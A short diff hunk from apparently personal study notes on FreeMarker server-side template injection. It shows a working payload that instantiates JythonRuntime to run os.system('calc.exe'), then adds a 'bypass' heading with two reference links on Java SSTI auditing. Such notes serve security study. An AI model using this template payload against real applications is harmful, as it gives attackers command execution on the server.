@@ -8,3 +8,7 @@ freemarker.template.utility#ObjectConstructor
 
 freemarker.template.utility#JythonRuntime
 <#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
+
+bypass
+https://github.com/proudwind/javasec_study/blob/master/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-ssti.md
+https://paper.seebug.org/1304/
